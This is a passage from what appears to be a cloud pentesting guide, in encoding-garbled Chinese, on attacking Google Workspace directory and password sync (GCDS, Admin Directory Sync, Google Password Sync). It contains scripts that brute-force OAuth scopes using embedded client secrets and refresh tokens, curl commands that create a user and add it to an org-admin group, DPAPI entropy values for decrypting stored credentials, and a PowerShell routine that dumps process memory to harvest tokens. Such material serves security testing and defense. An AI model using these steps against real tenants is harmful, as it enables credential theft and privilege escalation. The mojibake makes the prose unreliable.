--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCDS - èŒƒå›´

{% hint style="info" %}
è¯·æ³¨æ„ï¼Œå³ä½¿æ‹¥æœ‰åˆ·æ–°ä»¤ç‰Œï¼Œä¹Ÿæ— æ³•è¯·æ±‚è®¿é—®ä»¤ç‰Œçš„ä»»ä½•èŒƒå›´ï¼Œå› ä¸ºæ‚¨åªèƒ½è¯·æ±‚ **ç”±æ‚¨ç”Ÿæˆè®¿é—®ä»¤ç‰Œçš„åº”ç”¨ç¨‹åºæ”¯æŒçš„èŒƒå›´**ã€‚

æ­¤å¤–ï¼Œåˆ·æ–°ä»¤ç‰Œåœ¨æ¯ä¸ªåº”ç”¨ç¨‹åºä¸­éƒ½ä¸æ˜¯æœ‰æ•ˆçš„ã€‚
{% endhint %}

é»˜è®¤æƒ…å†µä¸‹ï¼ŒGCSDä¸ä¼šä»¥ç”¨æˆ·èº«ä»½è®¿é—®æ‰€æœ‰å¯èƒ½çš„OAuthèŒƒå›´ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è„šæœ¬æ‰¾åˆ°å¯ä»¥ä¸ `refresh_token` ä¸€èµ·ä½¿ç”¨ä»¥ç”Ÿæˆ `access_token` çš„èŒƒå›´ï¼š

<details>

<summary>ç”¨äºæš´åŠ›ç ´è§£èŒƒå›´çš„Bashè„šæœ¬</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=118556098869.apps.googleusercontent.com" \
--data "client_secret=Co-LoSjkPcQXD9EjJzWQcgpy" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03PR0VQOSCjS1CgYIARAAGAMSNwF-L9Ir5b_vOaCmnXzla0nL7dX7TJJwFcvrfgDPWI-j19Z4luLpYfLyv7miQyvgyXjGEXt-t0A" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

è¿™æ˜¯æˆ‘åœ¨å†™ä½œæ—¶å¾—åˆ°çš„è¾“å‡ºï¼š
```
https://www.googleapis.com/auth/admin.directory.group
https://www.googleapis.com/auth/admin.directory.orgunit
https://www.googleapis.com/auth/admin.directory.resource.calendar
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/admin.directory.userschema
https://www.googleapis.com/auth/apps.groups.settings
https://www.googleapis.com/auth/apps.licensing
https://www.googleapis.com/auth/contacts
```
#### åˆ›å»ºä¸€ä¸ªç”¨æˆ·å¹¶å°†å…¶æ·»åŠ åˆ°ç»„ `gcp-organization-admins` ä»¥å°è¯•åœ¨ GCP ä¸­æå‡æƒé™
```bash
# Create new user
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/users' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"primaryEmail": "deleteme@domain.com",
"name": {
"givenName": "Delete",
"familyName": "Me"
},
"password": "P4ssw0rdStr0ng!",
"changePasswordAtNextLogin": false
}'

# Add to group
curl -X POST \
'https://admin.googleapis.com/admin/directory/v1/groups/gcp-organization-admins@domain.com/members' \
-H 'Authorization: Bearer <ACCESS_TOKEN>' \
-H 'Content-Type: application/json' \
-d '{
"email": "deleteme@domain.com",
"role": "OWNER"
}'

# You could also change the password of a user for example
```
{% hint style="danger" %}
æ— æ³•å°†æ–°ç”¨æˆ·èµ‹äºˆè¶…çº§ç®¡ç†å‘˜è§’è‰²ï¼Œå› ä¸º**åˆ·æ–°ä»¤ç‰Œæ²¡æœ‰è¶³å¤Ÿçš„èŒƒå›´**æ¥æˆäºˆæ‰€éœ€çš„æƒé™ã€‚
{% endhint %}

## ç®¡ç†å‘˜ç›®å½•åŒæ­¥

è¿™ç§ä¸ GCDS åŒæ­¥ç”¨æˆ·çš„æ–¹å¼çš„ä¸»è¦åŒºåˆ«åœ¨äºï¼ŒGCDS æ˜¯é€šè¿‡ä¸€äº›éœ€è¦ä¸‹è½½å’Œè¿è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶æ‰‹åŠ¨å®Œæˆçš„ï¼Œè€Œ**ç®¡ç†å‘˜ç›®å½•åŒæ­¥æ˜¯æ— æœåŠ¡å™¨çš„**ï¼Œç”± Google åœ¨ [https://admin.google.com/ac/sync/externaldirectories](https://admin.google.com/ac/sync/externaldirectories) ç®¡ç†ã€‚

åœ¨æ’°å†™æœ¬æ–‡æ—¶ï¼Œè¯¥æœåŠ¡å¤„äºæµ‹è¯•é˜¶æ®µï¼Œæ”¯æŒä¸¤ç§ç±»å‹çš„åŒæ­¥ï¼šæ¥è‡ª**Active Directory**å’Œ**Azure Entra ID**ï¼š

* **Active Directoryï¼š**ä¸ºäº†è®¾ç½®æ­¤åŠŸèƒ½ï¼Œæ‚¨éœ€è¦**æˆäºˆ Google è®¿é—®æ‚¨çš„ Active Directory ç¯å¢ƒ**ã€‚ç”±äº Google ä»…èƒ½è®¿é—® GCP ç½‘ç»œï¼ˆé€šè¿‡**VPC è¿æ¥å™¨**ï¼‰ï¼Œæ‚¨éœ€è¦åˆ›å»ºä¸€ä¸ªè¿æ¥å™¨ï¼Œç„¶åé€šè¿‡åœ¨ GCP ç½‘ç»œä¸­çš„è™šæ‹Ÿæœºæˆ–ä½¿ç”¨ Cloud VPN æˆ– Cloud Interconnectï¼Œä½¿æ‚¨çš„ AD ä»è¯¥è¿æ¥å™¨å¯ç”¨ã€‚ç„¶åï¼Œæ‚¨è¿˜éœ€è¦æä¾›å…·æœ‰ç›®å½•è¯»å–æƒé™çš„å¸æˆ·çš„**å‡­æ®**å’Œé€šè¿‡**LDAPS**è”ç³»çš„**è¯ä¹¦**ã€‚
* **Azure Entra IDï¼š**è¦é…ç½®æ­¤åŠŸèƒ½ï¼Œåªéœ€åœ¨ Google æ˜¾ç¤ºçš„å¼¹å‡ºçª—å£ä¸­**ä½¿ç”¨å…·æœ‰è¯»å–æƒé™çš„ç”¨æˆ·ç™»å½• Azure**ï¼ŒGoogle å°†ä¿ç•™å¯¹ Entra ID çš„è¯»å–æƒé™çš„ä»¤ç‰Œã€‚

ä¸€æ—¦æ­£ç¡®é…ç½®ï¼Œè¿™ä¸¤ç§é€‰é¡¹éƒ½å°†å…è®¸**å°†ç”¨æˆ·å’Œç»„åŒæ­¥åˆ° Workspace**ï¼Œä½†ä¸å…è®¸ä» Workspace é…ç½®ç”¨æˆ·å’Œç»„åˆ° AD æˆ– EntraIDã€‚

åœ¨æ­¤åŒæ­¥è¿‡ç¨‹ä¸­ï¼Œå®ƒè¿˜å°†å…è®¸å…¶ä»–é€‰é¡¹ï¼š

* å‘æ–°ç”¨æˆ·å‘é€ç™»å½•ç”µå­é‚®ä»¶
* è‡ªåŠ¨å°†ä»–ä»¬çš„ç”µå­é‚®ä»¶åœ°å€æ›´æ”¹ä¸º Workspace ä½¿ç”¨çš„åœ°å€ã€‚å› æ­¤ï¼Œå¦‚æœ Workspace ä½¿ç”¨ `@hacktricks.xyz`ï¼Œè€Œ EntraID ç”¨æˆ·ä½¿ç”¨ `@carloshacktricks.onmicrosoft.com`ï¼Œåˆ™ä¸ºåœ¨å¸æˆ·ä¸­åˆ›å»ºçš„ç”¨æˆ·å°†ä½¿ç”¨ `@hacktricks.xyz`ã€‚
* é€‰æ‹©**åŒ…å«å°†è¢«åŒæ­¥çš„ç”¨æˆ·çš„ç»„**ã€‚
* é€‰æ‹©è¦åœ¨ Workspace ä¸­åŒæ­¥å’Œåˆ›å»ºçš„**ç»„**ï¼ˆæˆ–æŒ‡ç¤ºåŒæ­¥æ‰€æœ‰ç»„ï¼‰ã€‚

### ä» AD/EntraID -> Google Workspace (& GCP)

å¦‚æœæ‚¨æˆåŠŸæ”»é™·äº† AD æˆ– EntraIDï¼Œæ‚¨å°†å®Œå…¨æ§åˆ¶å°†ä¸ Google Workspace åŒæ­¥çš„ç”¨æˆ·å’Œç»„ã€‚\
ä½†æ˜¯ï¼Œè¯·æ³¨æ„ï¼Œç”¨æˆ·åœ¨ Workspace ä¸­å¯èƒ½ä½¿ç”¨çš„**å¯†ç **å¯èƒ½æ˜¯ç›¸åŒçš„ï¼Œä¹Ÿå¯èƒ½ä¸æ˜¯ã€‚

#### æ”»å‡»ç”¨æˆ·

å½“åŒæ­¥å‘ç”Ÿæ—¶ï¼Œå®ƒå¯èƒ½ä¼šåŒæ­¥**æ¥è‡ª AD çš„æ‰€æœ‰ç”¨æˆ·æˆ–ä»…æ¥è‡ªç‰¹å®š OU çš„ç”¨æˆ·**ï¼Œæˆ–ä»…**å±äº EntraID ä¸­ç‰¹å®šç»„çš„ç”¨æˆ·**ã€‚è¿™æ„å‘³ç€è¦æ”»å‡»ä¸€ä¸ªå·²åŒæ­¥çš„ç”¨æˆ·ï¼ˆæˆ–åˆ›å»ºä¸€ä¸ªæ–°çš„è¢«åŒæ­¥çš„ç”¨æˆ·ï¼‰ï¼Œæ‚¨éœ€è¦é¦–å…ˆå¼„æ¸…æ¥šå“ªäº›ç”¨æˆ·æ­£åœ¨è¢«åŒæ­¥ã€‚

* ç”¨æˆ·å¯èƒ½**é‡ç”¨æ¥è‡ª AD æˆ– EntraID çš„å¯†ç **ï¼Œä½†è¿™æ„å‘³ç€æ‚¨éœ€è¦**æ”»é™·ç”¨æˆ·çš„å¯†ç ä»¥ç™»å½•**ã€‚
* å¦‚æœæ‚¨å¯ä»¥è®¿é—®ç”¨æˆ·çš„**é‚®ä»¶**ï¼Œæ‚¨å¯ä»¥**æ›´æ”¹ç°æœ‰ç”¨æˆ·çš„ Workspace å¯†ç **ï¼Œæˆ–**åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·**ï¼Œç­‰å¾…å…¶è¢«åŒæ­¥å¹¶è®¾ç½®å¸æˆ·ã€‚

ä¸€æ—¦æ‚¨è®¿é—®äº† Workspace ä¸­çš„ç”¨æˆ·ï¼Œå¯èƒ½ä¼šé»˜è®¤æˆäºˆä¸€äº›**æƒé™**ã€‚

#### æ”»å‡»ç»„

æ‚¨è¿˜éœ€è¦é¦–å…ˆå¼„æ¸…æ¥šå“ªäº›ç»„æ­£åœ¨è¢«åŒæ­¥ã€‚å°½ç®¡æœ‰å¯èƒ½**æ‰€æœ‰**ç»„éƒ½åœ¨åŒæ­¥ï¼ˆå› ä¸º Workspace å…è®¸è¿™æ ·åšï¼‰ã€‚

{% hint style="info" %}
è¯·æ³¨æ„ï¼Œå³ä½¿ç»„å’Œæˆå‘˜èµ„æ ¼è¢«å¯¼å…¥åˆ° Workspaceï¼Œ**åœ¨ç”¨æˆ·åŒæ­¥ä¸­æœªåŒæ­¥çš„ç”¨æˆ·åœ¨ç»„åŒæ­¥æœŸé—´ä¹Ÿä¸ä¼šè¢«åˆ›å»º**ï¼Œå³ä½¿ä»–ä»¬æ˜¯ä»»ä½•åŒæ­¥ç»„çš„æˆå‘˜ã€‚
{% endhint %}

å¦‚æœæ‚¨çŸ¥é“å“ªäº›æ¥è‡ª Azure çš„ç»„åœ¨**Workspace æˆ– GCP ä¸­è¢«åˆ†é…æƒé™**ï¼Œæ‚¨å¯ä»¥å°†ä¸€ä¸ªè¢«æ”»é™·çš„ç”¨æˆ·ï¼ˆæˆ–æ–°åˆ›å»ºçš„ç”¨æˆ·ï¼‰æ·»åŠ åˆ°è¯¥ç»„ä¸­å¹¶è·å¾—è¿™äº›æƒé™ã€‚

è¿˜æœ‰å¦ä¸€ç§æ–¹æ³•å¯ä»¥æ»¥ç”¨ Workspace ä¸­ç°æœ‰çš„ç‰¹æƒç»„ã€‚ä¾‹å¦‚ï¼Œç»„ `gcp-organization-admins@<workspace.email>` é€šå¸¸åœ¨ GCP ä¸­å…·æœ‰é«˜æƒé™ã€‚

å¦‚æœä» EntraID åˆ° Workspace çš„åŒæ­¥**é…ç½®ä¸ºç”¨ Workspace çš„ç”µå­é‚®ä»¶æ›¿æ¢å¯¼å…¥å¯¹è±¡çš„åŸŸ**ï¼Œæ”»å‡»è€…å°†èƒ½å¤Ÿåœ¨ EntraID ä¸­åˆ›å»ºç»„ `gcp-organization-admins@<entraid.email>`ï¼Œå°†ç”¨æˆ·æ·»åŠ åˆ°è¯¥ç»„ï¼Œå¹¶ç­‰å¾…æ‰€æœ‰ç»„çš„åŒæ­¥å‘ç”Ÿã€‚\
**è¯¥ç”¨æˆ·å°†è¢«æ·»åŠ åˆ°ç»„ `gcp-organization-admins@<workspace.email>` ä¸­ï¼Œä»è€Œåœ¨ GCP ä¸­æå‡æƒé™ã€‚**

### ä» Google Workspace -> AD/EntraID

è¯·æ³¨æ„ï¼ŒWorkspace éœ€è¦å…·æœ‰å¯¹ AD æˆ– EntraID çš„åªè¯»è®¿é—®æƒé™çš„å‡­æ®ä»¥åŒæ­¥ç”¨æˆ·å’Œç»„ã€‚å› æ­¤ï¼Œç›®å‰æ— æ³•æ»¥ç”¨ Google Workspace å¯¹ AD æˆ– EntraID è¿›è¡Œä»»ä½•æ›´æ”¹ã€‚**å› æ­¤ï¼Œç›®å‰è¿™æ˜¯ä¸å¯èƒ½çš„**ã€‚

æˆ‘ä¹Ÿä¸çŸ¥é“ Google å°† AD å‡­æ®æˆ– EntraID ä»¤ç‰Œå­˜å‚¨åœ¨å“ªé‡Œï¼Œæ‚¨**æ— æ³•é€šè¿‡é‡æ–°é…ç½®åŒæ­¥æ¥æ¢å¤å®ƒä»¬**ï¼ˆå®ƒä»¬ä¸ä¼šå‡ºç°åœ¨ç½‘é¡µè¡¨å•ä¸­ï¼Œæ‚¨éœ€è¦å†æ¬¡æä¾›ï¼‰ã€‚ä½†æ˜¯ï¼Œä»ç½‘é¡µä¸Šå¯èƒ½å¯ä»¥æ»¥ç”¨å½“å‰åŠŸèƒ½æ¥**åˆ—å‡ºç”¨æˆ·å’Œç»„**ã€‚

## GPS - Google å¯†ç åŒæ­¥

è¿™æ˜¯ Google æä¾›çš„äºŒè¿›åˆ¶æ–‡ä»¶å’ŒæœåŠ¡ï¼Œç”¨äº**ä¿æŒç”¨æˆ·å¯†ç åœ¨ AD å’Œ Workspace ä¹‹é—´åŒæ­¥**ã€‚æ¯å½“ç”¨æˆ·åœ¨ AD ä¸­æ›´æ”¹å¯†ç æ—¶ï¼Œå®ƒä¼šè¢«è®¾ç½®åˆ° Googleã€‚

å®ƒå®‰è£…åœ¨ `C:\Program Files\Google\Password Sync`ï¼Œæ‚¨å¯ä»¥åœ¨æ­¤æ‰¾åˆ°ç”¨äºé…ç½®çš„äºŒè¿›åˆ¶æ–‡ä»¶ `PasswordSync.exe` å’Œå°†ç»§ç»­è¿è¡Œçš„æœåŠ¡ `password_sync_service.exe`ã€‚

### GPS - é…ç½®

è¦é…ç½®æ­¤äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆå’ŒæœåŠ¡ï¼‰ï¼Œéœ€è¦**æˆäºˆå…¶å¯¹ Workspace ä¸­è¶…çº§ç®¡ç†å‘˜ä¸»ä½“çš„è®¿é—®æƒé™**ï¼š

* é€šè¿‡**OAuth**ä¸ Google ç™»å½•ï¼Œç„¶åå®ƒä¼š**åœ¨æ³¨å†Œè¡¨ä¸­å­˜å‚¨ä¸€ä¸ªä»¤ç‰Œï¼ˆåŠ å¯†ï¼‰**
* ä»…åœ¨å…·æœ‰ GUI çš„åŸŸæ§åˆ¶å™¨ä¸Šå¯ç”¨
* æä¾›ä¸€äº›å…·æœ‰**ç®¡ç† Workspace ç”¨æˆ·**æƒé™çš„ GCP çš„**æœåŠ¡å¸æˆ·å‡­æ®**ï¼ˆjson æ–‡ä»¶ï¼‰
* éå¸¸ç³Ÿç³•çš„ä¸»æ„ï¼Œå› ä¸ºè¿™äº›å‡­æ®æ°¸è¿œä¸ä¼šè¿‡æœŸï¼Œå¯èƒ½ä¼šè¢«æ»¥ç”¨
* éå¸¸ç³Ÿç³•çš„ä¸»æ„æ˜¯ç»™äºˆ SA å¯¹ Workspace çš„è®¿é—®æƒé™ï¼Œå› ä¸º SA å¯èƒ½åœ¨ GCP ä¸­è¢«æ”»é™·ï¼Œå¹¶ä¸”å¯èƒ½ä¼šè½¬å‘ Workspace
* Google è¦æ±‚åœ¨æ²¡æœ‰ GUI çš„åŸŸæ§åˆ¶ä¸‹ä½¿ç”¨
* è¿™äº›å‡­æ®ä¹Ÿå­˜å‚¨åœ¨æ³¨å†Œè¡¨ä¸­

å…³äº ADï¼Œå¯ä»¥æŒ‡ç¤ºå®ƒä½¿ç”¨å½“å‰çš„**åº”ç”¨ç¨‹åºä¸Šä¸‹æ–‡ã€åŒ¿åæˆ–æŸäº›ç‰¹å®šå‡­æ®**ã€‚å¦‚æœé€‰æ‹©å‡­æ®é€‰é¡¹ï¼Œ**ç”¨æˆ·å**å°†å­˜å‚¨åœ¨**ç£ç›˜**ä¸­çš„æ–‡ä»¶ä¸­ï¼Œ**å¯†ç **å°†**åŠ å¯†**å¹¶å­˜å‚¨åœ¨**æ³¨å†Œè¡¨**ä¸­ã€‚

### GPS - ä»ç£ç›˜è½¬å‚¨å¯†ç å’Œä»¤ç‰Œ

{% hint style="success" %}
è¯·æ³¨æ„ï¼Œ[**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) èƒ½å¤Ÿæ£€æµ‹åˆ°**GPS**ï¼Œè·å–æœ‰å…³é…ç½®çš„ä¿¡æ¯ï¼Œ**ç”šè‡³è§£å¯†å¯†ç å’Œä»¤ç‰Œ**ã€‚
{% endhint %}

åœ¨æ–‡ä»¶ **`C:\ProgramData\Google\Google Apps Password Sync\config.xml`** ä¸­ï¼Œå¯ä»¥æ‰¾åˆ°éƒ¨åˆ†é…ç½®ï¼Œä¾‹å¦‚é…ç½®çš„ AD çš„**`baseDN`**å’Œæ­£åœ¨ä½¿ç”¨çš„**`username`**çš„å‡­æ®ã€‚

åœ¨æ³¨å†Œè¡¨ **`HKLM\Software\Google\Google Apps Password Sync`** ä¸­ï¼Œå¯ä»¥æ‰¾åˆ°**åŠ å¯†çš„åˆ·æ–°ä»¤ç‰Œ**å’Œ AD ç”¨æˆ·çš„**åŠ å¯†å¯†ç **ï¼ˆå¦‚æœæœ‰ï¼‰ã€‚æ­¤å¤–ï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯æŸäº›**SA å‡­æ®**è€Œä¸æ˜¯ä»¤ç‰Œï¼Œä¹Ÿå¯ä»¥åœ¨è¯¥æ³¨å†Œè¡¨åœ°å€ä¸­æ‰¾åˆ°è¿™äº›åŠ å¯†çš„å‡­æ®ã€‚è¯¥æ³¨å†Œè¡¨ä¸­çš„**å€¼**ä»…å¯¹**ç®¡ç†å‘˜**å¯è®¿é—®ã€‚

åŠ å¯†çš„**å¯†ç **ï¼ˆå¦‚æœæœ‰ï¼‰ä½äºé”® **`ADPassword`** ä¸­ï¼Œå¹¶ä½¿ç”¨**`CryptProtectData`** API è¿›è¡ŒåŠ å¯†ã€‚è¦è§£å¯†å®ƒï¼Œæ‚¨éœ€è¦ä¸é…ç½®å¯†ç åŒæ­¥çš„ç”¨æˆ·ç›¸åŒï¼Œå¹¶åœ¨ä½¿ç”¨**`CryptUnprotectData`** æ—¶ä½¿ç”¨æ­¤**ç†µ**ï¼š`byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

åŠ å¯†çš„ä»¤ç‰Œï¼ˆå¦‚æœæœ‰ï¼‰ä½äºé”® **`AuthToken`** ä¸­ï¼Œå¹¶ä½¿ç”¨**`CryptProtectData`** API è¿›è¡ŒåŠ å¯†ã€‚è¦è§£å¯†å®ƒï¼Œæ‚¨éœ€è¦ä¸é…ç½®å¯†ç åŒæ­¥çš„ç”¨æˆ·ç›¸åŒï¼Œå¹¶åœ¨ä½¿ç”¨**`CryptUnprotectData`** æ—¶ä½¿ç”¨æ­¤**ç†µ**ï¼š`byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
æ­¤å¤–ï¼Œå®ƒè¿˜ä½¿ç”¨å­—å…¸ **`0123456789abcdefghijklmnopqrstv`** è¿›è¡Œ base32hex ç¼–ç ã€‚

ç†µå€¼æ˜¯é€šè¿‡ä½¿ç”¨è¯¥å·¥å…·æ‰¾åˆ°çš„ã€‚å®ƒè¢«é…ç½®ä¸ºç›‘æ§å¯¹**`CryptUnprotectData`**å’Œ**`CryptProtectData`**çš„è°ƒç”¨ï¼Œç„¶åè¯¥å·¥å…·è¢«ç”¨æ¥å¯åŠ¨å’Œç›‘æ§ `PasswordSync.exe`ï¼Œè¯¥å·¥å…·å°†åœ¨å¼€å§‹æ—¶è§£å¯†é…ç½®çš„å¯†ç å’Œèº«ä»½éªŒè¯ä»¤ç‰Œï¼Œå¹¶**æ˜¾ç¤ºç”¨äºç†µçš„å€¼**ï¼š

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

è¯·æ³¨æ„ï¼Œä¹Ÿå¯ä»¥åœ¨å¯¹è¿™äº› API çš„è°ƒç”¨çš„è¾“å…¥æˆ–è¾“å‡ºä¸­æŸ¥çœ‹**è§£å¯†**çš„å€¼ï¼ˆä»¥é˜² Winpeas åœ¨æŸä¸ªæ—¶å€™åœæ­¢å·¥ä½œï¼‰ã€‚

å¦‚æœå¯†ç åŒæ­¥æ˜¯**ä½¿ç”¨ SA å‡­æ®é…ç½®çš„**ï¼Œå®ƒä¹Ÿå°†å­˜å‚¨åœ¨æ³¨å†Œè¡¨ **`HKLM\Software\Google\Google Apps Password Sync`** ä¸­çš„é”®å†…ã€‚

### GPS - ä»å†…å­˜è½¬å‚¨ä»¤ç‰Œ

ä¸ GCPW ä¸€æ ·ï¼Œå¯ä»¥è½¬å‚¨ `PasswordSync.exe` å’Œ `password_sync_service.exe` è¿›ç¨‹çš„å†…å­˜ï¼Œæ‚¨å°†èƒ½å¤Ÿæ‰¾åˆ°åˆ·æ–°å’Œè®¿é—®ä»¤ç‰Œï¼ˆå¦‚æœå®ƒä»¬å·²ç»ç”Ÿæˆï¼‰ã€‚\
æˆ‘æƒ³æ‚¨ä¹Ÿå¯ä»¥æ‰¾åˆ°é…ç½®çš„ AD å‡­æ®ã€‚

<details>

<summary>è½¬å‚¨ <code>PasswordSync.exe</code> å’Œ <code>password_sync_service.exe</code> è¿›ç¨‹å¹¶æœç´¢ä»¤ç‰Œ</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - ä»åˆ·æ–°ä»¤ç‰Œç”Ÿæˆè®¿é—®ä»¤ç‰Œ

ä½¿ç”¨åˆ·æ–°ä»¤ç‰Œï¼Œå¯ä»¥ä½¿ç”¨å®ƒä»¥åŠä»¥ä¸‹å‘½ä»¤ä¸­æŒ‡å®šçš„å®¢æˆ·ç«¯IDå’Œå®¢æˆ·ç«¯å¯†é’¥ç”Ÿæˆè®¿é—®ä»¤ç‰Œï¼š
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Scopes

{% hint style="info" %}
è¯·æ³¨æ„ï¼Œå³ä½¿æ‹¥æœ‰åˆ·æ–°ä»¤ç‰Œï¼Œä¹Ÿæ— æ³•è¯·æ±‚è®¿é—®ä»¤ç‰Œçš„ä»»ä½•èŒƒå›´ï¼Œå› ä¸ºæ‚¨åªèƒ½è¯·æ±‚**ç”±æ‚¨ç”Ÿæˆè®¿é—®ä»¤ç‰Œçš„åº”ç”¨ç¨‹åºæ”¯æŒçš„èŒƒå›´**ã€‚

æ­¤å¤–ï¼Œåˆ·æ–°ä»¤ç‰Œåœ¨æ¯ä¸ªåº”ç”¨ç¨‹åºä¸­éƒ½ä¸æ˜¯æœ‰æ•ˆçš„ã€‚
{% endhint %}

é»˜è®¤æƒ…å†µä¸‹ï¼ŒGPSä¸ä¼šä»¥ç”¨æˆ·èº«ä»½è®¿é—®æ‰€æœ‰å¯èƒ½çš„OAuthèŒƒå›´ï¼Œå› æ­¤ä½¿ç”¨ä»¥ä¸‹è„šæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å¯ä»¥ä¸`refresh_token`ä¸€èµ·ä½¿ç”¨ä»¥ç”Ÿæˆ`access_token`çš„èŒƒå›´ï¼š

<details>

<summary>ç”¨äºæš´åŠ›ç ´è§£èŒƒå›´çš„Bashè„šæœ¬</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

è¿™æ˜¯æˆ‘åœ¨å†™ä½œæ—¶å¾—åˆ°çš„è¾“å‡ºï¼š
```
https://www.googleapis.com/auth/admin.directory.user
```
å¦‚æœä¸æŒ‡æ˜ä»»ä½•èŒƒå›´ï¼Œæ‚¨å°†è·å¾—ç›¸åŒçš„ç»“æœã€‚

{% hint style="danger" %}
ä½¿ç”¨æ­¤èŒƒå›´ï¼Œæ‚¨å¯ä»¥**ä¿®æ”¹ç°æœ‰ç”¨æˆ·çš„å¯†ç ä»¥æå‡æƒé™**ã€‚
{% endhint %}

## å‚è€ƒæ–‡çŒ®

* [https://www.youtube.com/watch?v=FEQxHRRP\_5I](https://www.youtube.com/watch?v=FEQxHRRP\_5I)
* [https://issues.chromium.org/issues/40063291](https://issues.chromium.org/issues/40063291)

{% hint style="success" %}
